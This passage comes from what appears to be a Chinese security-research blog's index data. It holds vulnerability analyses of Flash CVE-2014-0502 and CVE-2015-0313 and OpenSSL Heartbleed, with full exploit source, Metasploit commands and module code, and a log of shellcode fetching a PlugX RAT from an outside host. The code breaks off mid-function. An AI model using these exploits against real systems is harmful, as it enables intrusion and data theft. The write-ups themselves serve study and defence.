prefix=0, unique=0,buf=12fca4) = 245D  Path = C:\\users\\jaime\\Temp\\245d.tmp InternetOpenA()InternetOpenUrlA(http://4.59.XX.XX/common/update.exe)CreateFileA(C:\\users\\jaime\\Temp\\245d.tmp) = 4 InternetReadFile(1, buf: 12fbe8, size:64) InternetCloseHandle(1) = 1 InternetCloseHandle(1) = 1 CloseHandle(4)\n\n使用到的 payload 是远程控制程序 PlugX RAT，shellcode 会将 payload 注入到 svchost 进程中以便于通过 HTTP 进行 C&amp;C 交互\n最终受害者机器沦陷，漏洞利用结束\n漏洞修复无论刷新与否皆强制刷新 Pending Flush 标志或增加重入保护锁即可\nReferenceDeep Analysis of CVE-2014-0502 – A Double Free StoryLarryS - CVE-2014-0502CVEFEED - CVE-2014-0502Adobe - CVE-2014-0502 - apsb14-07：Security updates available for Adobe Flash PlayerNVD - CVE-2014-0502CVE - CVE-2014-0502漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2015-0313 漏洞研究","url":"/2025/05/05/Vulnerability%20Investigation/CVE-2015-0313%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"趋势科技公司于 2015 年 2 月曝光了一个 Adobe Flash 0day 被外部恶意利用的信息，访问被该漏洞挂马的网站会自动下载恶意软件或弹出恶意广告等，影响甚广。该 Adobe Flash 0day 被命名为 CVE-2015-0313 Adobe Flash Player Workers ByteArray UAF 漏洞，其漏洞利用能够让攻击者实现任意代码执行\n影响范围：\nAdobe Flash Player before 13.0.0.269 and 14.x through 16.x before 16.0.0.305 on Windows and OS X and before 11.2.202.442 on Linux\n漏洞分析开启 hpa 调试运行 FlashPlayer 并打开样本，程序因触发 Access Violation 异常而崩溃。逆向 AVM 有点折磨所以直接从样本源码入手进行分析\n// Build how to:// 1. Download the AIRSDK, and use its compiler.// 2. Be support to support 16.0 as target-player (flex-config.xml).// 3. Download the Flex SDK (4.6)// 4. Copy the Flex SDK libs (&lt;FLEX_SDK&gt;/framework/libs) to the AIRSDK folder (&lt;AIR_SDK&gt;/framework/libs)//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)// 5. Build with: mxmlc -o msf.swf Main.as// Original code by @hdarwin89 // http://hacklab.kr/flash-cve-2015-0313-%EB%B6%84%EC%84%9D/// Modified to be used from msfpackage&#123;import flash.display.Spriteimport flash.display.LoaderInfoimport flash.events.Eventimport flash.utils.ByteArrayimport flash.system.Workerimport flash.system.WorkerDomainimport flash.system.MessageChannelimport flash.system.ApplicationDomainimport avm2.intrinsics.memory.casi32import mx.utils.Base64Decoderpublic class Exploit extends Sprite&#123;    private var ov:Vector.&lt;Object&gt; = new Vector.&lt;Object&gt;(80000)    private var uv:Vector.&lt;uint&gt;    private var ba:ByteArray = new ByteArray()    private var worker:Worker    private var mc:MessageChannel    private var b64:Base64Decoder = new Base64Decoder()    private var payload:ByteArray    private var platform:String    private var os:String    private var exploiter:Exploiter    public function Exploit()    &#123;        if (Worker.current.isPrimordial) mainThread() //* 在构造函数中判断是否为主线程并分别执行对应函数        else workerThread()    &#125;    private function mainThread():void    &#123;        platform = LoaderInfo(this.root.loaderInfo).parameters.pl        os = LoaderInfo(this.root.loaderInfo).parameters.os        var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh        var pattern:RegExp = / /g;        b64_payload = b64_payload.replace(pattern, &quot;+&quot;)        b64.decode(b64_payload)        payload = b64.toByteArray()        ba.length = 0x1000        ba.shareable = true        for (var i:uint = 0; i &lt; ov.length; i++) &#123;            ov[i] = new Vector.&lt;uint&gt;(1014)            ov[i][0] = 0xdeedbeef        &#125;        for (i = 0; i &lt; 70000; i += 2) &#123;            delete(ov[i])        &#125;        worker = WorkerDomain.current.createWorker(this.loaderInfo.bytes) //* 创建后台 worker        mc = worker.createMessageChannel(Worker.current)        mc.addEventListener(Event.CHANNEL_MESSAGE, onMessage) //* 设置事件监听函数        worker.setSharedProperty(&quot;mc&quot;, mc)        worker.setSharedProperty(&quot;ba&quot;, ba)        ApplicationDomain.currentDomain.domainMemory = ba //* 将可分享的 ByteArray 对象设置为全局可用        worker.start()    &#125;    private function workerThread():void    &#123;        var ba:ByteArray = Worker.current.getSharedProperty(&quot;ba&quot;)        var mc:MessageChannel = Worker.current.getSharedProperty(&quot;mc&quot;)        ba.clear() //* 清理共享内存 ByteArray        ov[0] = new Vector.&lt;uint&gt;(1022) //* 每个 Unit Vector 长度为 1022，大小为 1022*4+8=0x1000，即 ba 的大小        mc.send(&quot;&quot;) //* 发送消息给主线程        while (mc.messageAvailable);        for (var i:uint = 0;; i++) &#123;            if (ov[0][i] == 1014 &amp;&amp; ov[0][i + 2] == 0xdeedbeef) &#123;                ov[0][i] = 0xffffffff                break            &#125;        &#125;        ov[0][0xfffffffe] = 1014        mc.send(&quot;&quot;)    &#125;    private function onMessage(e:Event):void    &#123;        var mod:uint = casi32(0, 1022, 0xFFFFFFFF) //* 比较并交换 domainMemory 地址的变量值        Logger.log(&quot;[*] Exploit - onMessage(): mod: &quot; + mod.toString())        if (mod == 1022) mc.receive()        else &#123;                        for (var i:uint = 0; i &lt; ov.length; i++) &#123;                if (ov[i].length == 0xffffffff) &#123;                    uv = ov[i]                &#125; else &#123;                    if (ov[i] != null) &#123;                        delete(ov[i])                        ov[i] = null                    &#125;                &#125;            &#125;            if (uv == null) &#123;                Logger.log(&quot;[!] Exploit - onMessage(): Corrupted Vector not found&quot;)                return            &#125;            exploiter = new Exploiter(this, platform, os, payload, uv)        &#125;    &#125;&#125;&#125;\n\n具体函数内进行的操作已标记在注释中。总结下来漏洞的触发流程是\n\n在主 worker 中创建子 worker，然后 worker 间共享 ByteArray 数据\n在主 worker 中将共享的 ByteArray 对象设置为 domainMemory\n在子 worker 中通过 ByteArray.Clear 将共享的 ByteArray 内存清除\n但是这时候 domainMemory 依然可以引用共享的内存区域，这是因为子 worker 调用 clear 清除内存的时候没有通知 domainMemory 修改对共享的引用\n\n因此导致 UAF 漏洞\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2015-0313\n\n搜索结果\nMatching Modules================   #  Name                                                       Disclosure Date  Rank   Check  Description   -  ----                                                       ---------------  ----   -----  -----------   0  exploit/windows/browser/adobe_flash_worker_byte_array_uaf  2015-02-02       great  No     Adobe Flash Player ByteArray With Workers Use After FreeInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/browser/adobe_flash_worker_byte_array_uaf\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/browser/adobe_flash_worker_byte_array_uafmsf6 exploit(windows/browser/adobe_flash_worker_byte_array_uaf) &gt; info\n\n模块详情信息\n       Name: Adobe Flash Player ByteArray With Workers Use After Free     Module: exploit/windows/browser/adobe_flash_worker_byte_array_uaf   Platform: Windows       Arch:  Privileged: No    License: Metasploit Framework License (BSD)       Rank: Great  Disclosed: 2015-02-02Provided by:  Unknown  hdarwin  juan vazquez &lt;juan.vazquez@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   AutomaticCheck supported:  NoBasic options:  Name     Current Setting  Required  Description  ----     ---------------  --------  -----------  Retries  true             no        Allow the browser to retry the module  SRVHOST  *******          yes       The local host or network interface to listen on. This must be an address on the local machine or ******* to listen on all addresses.  SRVPORT  8080             yes       The local port to listen on.  SSL      false            no        Negotiate SSL for incoming connections  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)  URIPATH                   no        The URI to use for this exploit (default is random)Payload information:Description:  This module exploits a use-after-free vulnerability in Adobe Flash Player. The  vulnerability occurs when the ByteArray assigned to the current ApplicationDomain  is freed from an ActionScript worker, which can fill the memory and notify the main  thread to corrupt the new contents. This module has been tested successfully on  Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 16.0.0.296.References:  https://nvd.nist.gov/vuln/detail/CVE-2015-0313  https://helpx.adobe.com/security/products/flash-player/apsa15-02.html  http://hacklab.kr/flash-cve-2015-0313-%EB%B6%84%EC%84%9D/  http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2015-0313-the-new-flash-player-zero-day/View the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/browser/adobe_flash_worker_byte_array_uaf) &gt; set payload windows/execmsf6 exploit(windows/browser/adobe_flash_worker_byte_array_uaf) &gt; set CMD calc.exemsf6 exploit(windows/browser/adobe_flash_worker_byte_array_uaf) &gt; exploit\n\n随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其响应异常 HTML 页面以触发漏洞\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/browser/adobe_flash_worker_byte_array_uaf.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = GreatRanking  include Msf::Exploit::Remote::BrowserExploitServer  def initialize(info=&#123;&#125;)    super(update_info(info,      &#x27;Name&#x27;                =&gt; &#x27;Adobe Flash Player ByteArray With Workers Use After Free&#x27;,      &#x27;Description&#x27;         =&gt; %q&#123;...&#125;,      &#x27;License&#x27;             =&gt; MSF_LICENSE,      &#x27;Author&#x27;              =&gt; [...],      &#x27;References&#x27;          =&gt; [...],      &#x27;Payload&#x27;             =&gt; &#123;...&#125;,      &#x27;Platform&#x27;            =&gt; &#x27;win&#x27;,      &#x27;BrowserRequirements&#x27; =&gt; &#123;          :source  =&gt; /script|headers/i,          :os_name =&gt; lambda do |os|            os =~ OperatingSystems::Match::WINDOWS_7 ||              os =~ OperatingSystems::Match::WINDOWS_81          end,          :ua_name =&gt; lambda &#123; |ua| [Msf::HttpClients::IE, Msf::HttpClients::FF].include?(ua) &#125;,          :flash   =&gt; lambda &#123; |ver| ver =~ /^16\\./ &amp;&amp; Rex::Version.new(ver) &lt;= Rex::Version.new(&#x27;16.0.0.296&#x27;) &#125;,          :arch    =&gt; ARCH_X86        &#125;,      &#x27;Targets&#x27;             =&gt; [...],      &#x27;Privileged&#x27;          =&gt; false,      &#x27;DisclosureDate&#x27;      =&gt; &#x27;2015-02-02&#x27;,      &#x27;DefaultTarget&#x27;       =&gt; 0))  end  def exploit    @swf = create_swf    super  end  def on_request_exploit(cli, request, target_info)    print_status(&quot;Request: #&#123;request.uri&#125;&quot;)    if request.uri =~ /\\.swf$/      print_status(&#x27;Sending SWF...&#x27;)      send_response(cli, @swf, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;application/x-shockwave-flash&#x27;, &#x27;Cache-Control&#x27; =&gt; &#x27;no-cache, no-store&#x27;, &#x27;Pragma&#x27; =&gt; &#x27;no-cache&#x27;&#125;)      return    end    print_status(&#x27;Sending HTML...&#x27;)    send_exploit_html(cli, exploit_template(cli, target_info), &#123;&#x27;Pragma&#x27; =&gt; &#x27;no-cache&#x27;&#125;)  end  def exploit_template(cli, target_info)    swf_random = &quot;#&#123;rand_text_alpha(4 + rand(3))&#125;.swf&quot;    target_payload = get_payload(cli, target_info)    b64_payload = Rex::Text.encode_base64(target_payload)    platform_id = &#x27;win&#x27;    os_name = target_info[:os_name]    html_template = %Q|&lt;html&gt;    &lt;body&gt;    &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab&quot; width=&quot;1&quot; height=&quot;1&quot; /&gt;    &lt;param name=&quot;movie&quot; value=&quot;&lt;%=swf_random%&gt;&quot; /&gt;    &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;    &lt;param name=&quot;FlashVars&quot; value=&quot;sh=&lt;%=b64_payload%&gt;&amp;pl=&lt;%=platform_id%&gt;&amp;os=&lt;%=os_name%&gt;&quot; /&gt;    &lt;param name=&quot;Play&quot; value=&quot;true&quot; /&gt;    &lt;embed type=&quot;application/x-shockwave-flash&quot; width=&quot;1&quot; height=&quot;1&quot; src=&quot;&lt;%=swf_random%&gt;&quot; allowScriptAccess=&quot;always&quot; FlashVars=&quot;sh=&lt;%=b64_payload%&gt;&amp;pl=&lt;%=platform_id%&gt;&amp;os=&lt;%=os_name%&gt;&quot; Play=&quot;true&quot;/&gt;    &lt;/object&gt;    &lt;/body&gt;    &lt;/html&gt;    |    return html_template, binding()  end  def create_swf    path = ::File.join(Msf::Config.data_directory, &#x27;exploits&#x27;, &#x27;CVE-2015-0313&#x27;, &#x27;msf.swf&#x27;)    swf =  ::File.open(path, &#x27;rb&#x27;) &#123; |f| swf = f.read &#125;    swf  endend\n\n利用思路与分析的 PoC 和常规 UAF 漏洞利用一致，在此不再赘述\n漏洞修复\nAdobe 禁止了将具有共享属性的 ByteArray 设置为 domainMemory 进而阻止了 UAF 修复了此漏洞\nReferenceTrend - Adobe Flash Player Unspecified Vulnerability (CVE-2015-0313)ExploitDB - CVE-2015-0313Microsoft 安全公告 MS14-012 - 严重NVD - CVE-2015-0313CVE - CVE-2015-0313漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2014-0160 漏洞研究","url":"/2025/06/06/Vulnerability%20Investigation/CVE-2014-0160%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"​OpenSSL 是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及 SSL 协议。2014 年 4 月 7 日，OpenSSL 官方发布了一项安全公告，称 OpenSSL 的 HeartBeat 模块存在一处严重漏洞(CVE-2014-0160)，主要影响 OpenSSL 1.0.1~1.0.2beta1 测试版。问题出现在 ssl&#x2F;dl_both.c 中的 HeartBeat 部分，OpenSSL 1.0.1 中的 TLS 和 DTLS 在实现上没有严格处理 Heartbeat 扩展包，心跳处理逻辑没有检测心跳包中的长度字段是否和后续的数据字段相符合（缺少边界检查）。攻击者可以通过构造恶意数据包导致服务端的 memcpy 函数把 SSLv3 记录之后的数据直接输出，进而允许攻击者远程读取存在漏洞版本的 OpenSSL 服务器内存中多达 64K 的数据，包括但不限于用户登录态的 Cookie 甚至是账号密码。由于 OpenSSL 的广泛使用，该漏洞危害范围之广，影响之巨令人咋舌，已经不仅是技术层面的缓冲区溢出 Bug，更暴露了互联网基础设施的脆弱和开源维护资源的匮乏，因而被冠名为 HeartBleed 漏洞后作为 2014 年最具破坏性的漏洞名列 2014 年十大安全事件之一，推动了从代码审计到政策制定的全方位变革，其漏洞 Logo （一颗破碎的心）成为网络安全警示标志。哪怕到了十余年后的今天，也仍是网络安全研究的经典案例，警醒着每一位安全从业人员\n影响范围：\nOpenSSL 1.0.1 before 1.0.1g\nHeart BeatHeartbleed 发生于 OpenSSL 的 HeartBeat（心跳）服务————「心跳」是一种常见的运维设计思想，即连接一端的计算机发出一条简短数据，协议另一端的计算机是否仍然在线，并获取反馈数据。由于这种用于运维的链接可能是周期性的，因此被称为心跳。心跳机制允许一个 TLS 对等体向另一个对等体发送一个心跳请求，接收方应以心跳响应形式回送相同的数据。具体流程如下：\n\n心跳请求：一方发送包含随机数据和请求类型的心跳请求消息。\n心跳响应：接收方在接收到心跳请求后，必须在心跳响应消息中返回相同的随机数据。\n\n心跳包的格式为\n\n\n\n心跳包字段\n长度(byte)\n说明\n\n\n\nContentType\n1\n心跳包类型，IANA 组织把 type 编号定义为 24（0x18）\n\n\nProtocolVersion\n2\nTLS 的版本号，目前主要包括含有心跳扩展的TLS版本：TLSv1.0，TLSv1.1，TLSv1.2\n\n\nlength\n2\nHeartbeatMessage 的长度\n\n\nHeartbeatMessageType\n1\nHeartbeat 类型 01 表示 heartbeat_request,02 表示 heartbeat_response\n\n\npayload_length\n2\npayload 长度\n\n\npayload\npayload_length\npayload 的具体内容\n\n\npadding\n&gt;&#x3D;16\npadding 填充，最少为 16 个字节\n\n\n漏洞分析OpenSSL 是开源项目，因此可以直接查看其 security patch 和源代码进行漏洞分析。注意到补丁主要修复了 ssl&#x2F;d1_both.c 中的 dtls1_process_heartbeat(SSL *s) 和 ssl&#x2F;t1_lib.c 中的 tls1_process_heartbeat(SSL *s) 函数。打开源码对这两个函数进行代码审计，以 tls1_process_heartbeat(SSL *s) 函数为例，其核心代码为\nintdtls1_process_heartbeat(SSL *s)    &#123;    unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0]; //* 接收到的心跳包的数据    ...    unsigned int payload; //* paylood 长度    unsigned int padding = 16; /* Use minimum padding */    ...    hbtype = *p++; //* 读取心跳包类型    n2s(p, payload); //* 从心跳包数据中提取出 payload 长度    ...    if (hbtype == TLS1_HB_REQUEST)        &#123;        unsigned char *buffer, *bp;        unsigned int write_length = 1 /* heartbeat type */ +                        2 /* heartbeat length */ +                        payload + padding;        ...        /* Allocate memory for the response, size is 1 byte         * message type, plus 2 bytes payload length, plus         * payload, plus padding         */        buffer = OPENSSL_malloc(write_length); //* 分配缓冲区        bp = buffer;        ...        memcpy(bp, pl, payload); //* Vul Point        ...        r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, write_length);        ...        OPENSSL_free(buffer);        ...        &#125;    else if (hbtype == TLS1_HB_RESPONSE)        &#123;        ...        &#125;    return 0;    &#125;\n\n相关执行逻辑已标记在注释中。造成漏洞的代码为\nmemcpy(bp, pl, payload); //* Vul Point\n\n写入响应包的数据的大小 payload 取决于请求包的 payload 大小，因此若请求包声明的 payload 大小被伪造则将越越界读取内存数据造成信息泄露\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2014-0160\n\n搜索结果\nMatching Modules================   #  Name                                              Disclosure Date  Rank    Check  Description   -  ----                                              ---------------  ----    -----  -----------   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak   2    \\_ action: DUMP                                 .                .       .      Dump memory contents to loot   3    \\_ action: KEYS                                 .                .       .      Recover private keys from memory   4    \\_ action: SCAN                                 .                .       .      Check hosts for vulnerabilityInteract with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/ssl/openssl_heartbleedAfter interacting with a module you can manually set a ACTION with set ACTION &#x27;SCAN&#x27;\n\n调用该模块并查看模块详情\nmsf6 &gt; use auxiliary/scanner/ssl/openssl_heartbleedmsf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; info\n\n模块详情信息\n       Name: OpenSSL Heartbeat (Heartbleed) Information Leak     Module: auxiliary/scanner/ssl/openssl_heartbleed    License: Metasploit Framework License (BSD)       Rank: Normal  Disclosed: 2014-04-07Provided by:  Neel Mehta  Riku  Antti  Matti  Jared Stafford &lt;jspenguin@jspenguin.org&gt;  FiloSottile  Christian Mehlmauer &lt;FireFart@gmail.com&gt;  wvu &lt;wvu@metasploit.com&gt;  juan vazquez &lt;juan.vazquez@metasploit.com&gt;  Sebastiano Di Paola  Tom Sellers  jjarmoc  Ben Buchanan  herselfAvailable actions:    Name  Description    ----  -----------    DUMP  Dump memory contents to loot    KEYS  Recover private keys from memory=&gt;  SCAN  Check hosts for vulnerabilityCheck supported:  YesBasic options:  Name              Current Setting  Required  Description  ----              ---------------  --------  -----------  DUMPFILTER                         no        Pattern to filter leaked memory before storing  LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP invocation  MAX_KEYTRIES      50               yes       Max tries to dump key  RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response  RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html  RPORT             443              yes       The target port (TCP)  STATUS_EVERY      5                yes       How many retries until key dump status  THREADS           1                yes       The number of concurrent threads (max one per host)  TLS_CALLBACK      None             yes       Protocol to use, &quot;None&quot; to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)  TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)Description:  This module implements the OpenSSL Heartbleed attack. The problem  exists in the handling of heartbeat requests, where a fake length can  be used to leak memory data in the response. Services that support  STARTTLS may also be vulnerable.  The module supports several actions, allowing for scanning, dumping of  memory contents to loot, and private key recovery.  The LEAK_COUNT option can be used to specify leaks per SCAN or DUMP.  The repeat command can be used to make running the SCAN or DUMP many  times more powerful. As in:      repeat -t 60 run; sleep 2  To run every two seconds for one minute.References:  https://nvd.nist.gov/vuln/detail/CVE-2014-0160  https://www.kb.cert.org/vuls/id/720951  https://www.cisa.gov/uscert/ncas/alerts/TA14-098A  https://heartbleed.com/  https://github.com/FiloSottile/Heartbleed  https://gist.github.com/takeshixx/10107280  https://filippo.io/Heartbleed/Also known as:  HeartbleedView the full module info with the info -d command\n\n设置 RHOSTS 和 RPORT 后还需要设置 verbose 为 true 才能看到泄露信息\nmsf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; exploit\n\n执行 exp 获取敏感数据\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework### TODO: Connection reuse: Only connect once and send subsequent heartbleed requests.#   We tried it once in https://github.com/rapid7/metasploit-framework/pull/3300#   but there were too many errors# TODO: Parse the rest of the server responses and return a hash with the data# TODO: Extract the relevant functions and include them in the frameworkclass MetasploitModule &lt; Msf::Auxiliary  include Msf::Exploit::Remote::Tcp  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  CIPHER_SUITES = [    0xc014, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA    0xc00a, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA    0xc022, # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA    0xc021, # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA    0x0039, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA    0x0038, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA    0x0088, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA    0x0087, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA    0x0087, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA    0xc00f, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA    0x0035, # TLS_RSA_WITH_AES_256_CBC_SHA    0x0084, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA    0xc012, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA    0xc008, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA    0xc01c, # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA    0xc01b, # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA    0x0016, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA    0x0013, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA    0xc00d, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA    0xc003, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA    0x000a, # TLS_RSA_WITH_3DES_EDE_CBC_SHA    0xc013, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA    0xc009, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA    0xc01f, # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA    0xc01e, # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA    0x0033, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA    0x0032, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA    0x009a, # TLS_DHE_RSA_WITH_SEED_CBC_SHA    0x0099, # TLS_DHE_DSS_WITH_SEED_CBC_SHA    0x0045, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA    0x0044, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA    0xc00e, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA    0xc004, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA    0x002f, # TLS_RSA_WITH_AES_128_CBC_SHA    0x0096, # TLS_RSA_WITH_SEED_CBC_SHA    0x0041, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA    0xc011, # TLS_ECDHE_RSA_WITH_RC4_128_SHA    0xc007, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA    0xc00c, # TLS_ECDH_RSA_WITH_RC4_128_SHA    0xc002, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA    0x0005, # TLS_RSA_WITH_RC4_128_SHA    0x0004, # TLS_RSA_WITH_RC4_128_MD5    0x0015, # TLS_DHE_RSA_WITH_DES_CBC_SHA    0x0012, # TLS_DHE_DSS_WITH_DES_CBC_SHA    0x0009, # TLS_RSA_WITH_DES_CBC_SHA    0x0014, # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA    0x0011, # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA    0x0008, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA    0x0006, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5    0x0003, # TLS_RSA_EXPORT_WITH_RC4_40_MD5    0x00ff  # Unknown  ]  SSL_RECORD_HEADER_SIZE            = 0x05  HANDSHAKE_RECORD_TYPE             = 0x16  HEARTBEAT_RECORD_TYPE             = 0x18  ALERT_RECORD_TYPE                 = 0x15  HANDSHAKE_SERVER_HELLO_TYPE       = 0x02  HANDSHAKE_CERTIFICATE_TYPE        = 0x0b  HANDSHAKE_KEY_EXCHANGE_TYPE       = 0x0c  HANDSHAKE_SERVER_HELLO_DONE_TYPE  = 0x0e  TLS_VERSION = &#123;    &#x27;SSLv3&#x27; =&gt; 0x0300,    &#x27;1.0&#x27;   =&gt; 0x0301,    &#x27;1.1&#x27;   =&gt; 0x0302,    &#x27;1.2&#x27;   =&gt; 0x0303  &#125;  TLS_CALLBACKS = &#123;    &#x27;SMTP&#x27;   =&gt; :tls_smtp,    &#x27;IMAP&#x27;   =&gt; :tls_imap,    &#x27;JABBER&#x27; =&gt; :tls_jabber,    &#x27;POP3&#x27;   =&gt; :tls_pop3,    &#x27;FTP&#x27;    =&gt; :tls_ftp,    &#x27;POSTGRES&#x27;   =&gt; :tls_postgres  &#125;  # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252  SAFE_CHECK_MAX_RECORD_LENGTH = (1 &lt;&lt; 14)  # For verbose output, deduplicate repeated characters beyond this threshold  DEDUP_REPEATED_CHARS_THRESHOLD = 400  def initialize    super(      &#x27;Name&#x27;           =&gt; &#x27;OpenSSL Heartbeat (Heartbleed) Information Leak&#x27;,      &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,      &#x27;Author&#x27;         =&gt; [...],      &#x27;References&#x27;     =&gt; [...],      &#x27;DisclosureDate&#x27; =&gt; &#x27;2014-04-07&#x27;,      &#x27;License&#x27;        =&gt; MSF_LICENSE,      &#x27;Actions&#x27;        =&gt; [...],      &#x27;DefaultAction&#x27; =&gt; &#x27;SCAN&#x27;,      &#x27;Notes&#x27; =&gt; &#123;...&#125;    )    register_options(      [        Opt::RPORT(443),        OptEnum.new(&#x27;TLS_CALLBACK&#x27;, [true, &#x27;Protocol to use, &quot;None&quot; to use raw TLS sockets&#x27;, &#x27;None&#x27;, [ &#x27;None&#x27;, &#x27;SMTP&#x27;, &#x27;IMAP&#x27;, &#x27;JABBER&#x27;, &#x27;POP3&#x27;, &#x27;FTP&#x27;, &#x27;POSTGRES&#x27; ]]),        OptEnum.new(&#x27;TLS_VERSION&#x27;, [true, &#x27;TLS/SSL version to use&#x27;, &#x27;1.0&#x27;, [&#x27;SSLv3&#x27;,&#x27;1.0&#x27;, &#x27;1.1&#x27;, &#x27;1.2&#x27;]]),        OptInt.new(&#x27;MAX_KEYTRIES&#x27;, [true, &#x27;Max tries to dump key&#x27;, 50]),        OptInt.new(&#x27;STATUS_EVERY&#x27;, [true, &#x27;How many retries until key dump status&#x27;, 5]),        OptRegexp.new(&#x27;DUMPFILTER&#x27;, [false, &#x27;Pattern to filter leaked memory before storing&#x27;, nil]),        OptInt.new(&#x27;RESPONSE_TIMEOUT&#x27;, [true, &#x27;Number of seconds to wait for a server response&#x27;, 10]),        OptInt.new(&#x27;LEAK_COUNT&#x27;, [true, &#x27;Number of times to leak memory per SCAN or DUMP invocation&#x27;, 1])      ])    register_advanced_options(      [        OptInt.new(&#x27;HEARTBEAT_LENGTH&#x27;, [true, &#x27;Heartbeat length&#x27;, 65535]),        OptString.new(&#x27;XMPPDOMAIN&#x27;, [true, &#x27;The XMPP Domain to use when Jabber is selected&#x27;, &#x27;localhost&#x27;])      ])  end  #  # Main methods  #  # Called when using check  def check_host(ip)    @check_only = true    vprint_status &quot;Checking for Heartbleed exposure&quot;    if bleed      Exploit::CheckCode::Appears    else      Exploit::CheckCode::Safe    end  end  # Main method  def run    if heartbeat_length &gt; 65535 || heartbeat_length &lt; 0      print_error(&#x27;HEARTBEAT_LENGTH should be a natural number less than 65536&#x27;)      return    end    if response_timeout &lt; 0      print_error(&#x27;RESPONSE_TIMEOUT should be bigger than 0&#x27;)      return    end    super  end  # Main method  def run_host(ip)    case action.name      # SCAN and DUMP are similar, but DUMP stores loot      when &#x27;SCAN&#x27;, &#x27;DUMP&#x27;        # &#x27;Tis but a scratch        bleeded = &#x27;&#x27;        1.upto(leak_count) do |count|          vprint_status(&quot;Leaking heartbeat response ##&#123;count&#125;&quot;)          bleeded &lt;&lt; bleed.to_s        end        loot_and_report(bleeded)      when &#x27;KEYS&#x27;        get_keys      else        # Shouldn&#x27;t get here, since Action is Enum        print_error(&quot;Unknown Action: #&#123;action.name&#125;&quot;)    end    # ensure all connections are closed    